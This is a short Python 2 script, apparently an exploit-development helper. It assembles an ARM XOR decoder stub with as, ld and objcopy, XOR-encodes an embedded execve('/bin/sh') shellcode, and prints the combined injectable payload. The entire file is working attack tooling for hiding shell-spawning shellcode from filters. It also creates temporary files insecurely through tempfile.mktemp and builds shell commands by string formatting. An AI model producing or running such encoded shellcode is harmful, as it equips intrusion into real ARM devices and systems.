#!python
import os
import tempfile

def MakeXOR(size, xor=0x58):
    XOR="""
    .global _start
    .section .text

    _start:
        add r6, pc, #36
        bx  r6

    main:
        mov r4, #%s

    loop:
        cmp r4, #256
        bxhi lr
        sub r4, r4, #%s
        ldrb r5, [lr, r4]
        eor  r5, r5, #%s
        strb r5, [lr, r4]
        add  r4, r4, #%s
        
        b loop
        bl main

    scode:
    """ % (size, size, xor, size+1)

    fn = tempfile.mktemp() # binary file
    fn_s = fn + '.s' # as file
    fn_o = fn + '.o' # ld file
    fn_raw = fn + '.raw' # objcopy

    open(fn_s, 'w').write(XOR)
    os.system("as %s -o %s;ld %s -o %s" % (fn_s, fn_o, fn_o, fn));
    os.system("objcopy -I elf32-little -j .text -O binary %s %s" % (fn, fn_raw))
    if os.path.exists(fn_raw) == False:
        return ""
    
    f = open(fn_raw,'rb').read()

    os.unlink(fn)
    os.unlink(fn_s)
    os.unlink(fn_o)
    os.unlink(fn_raw)

    return f

# /bin/sh
SC = "01608fe216ff2fe102a000220b2705b4694601df2f62696e2f7368000000c046".decode('hex')

XORSC = ''
for v in SC:
    XORSC += chr( ord(v) ^ 0x58 )

XORER = MakeXOR(len(XORSC))
print (XORER + XORSC)
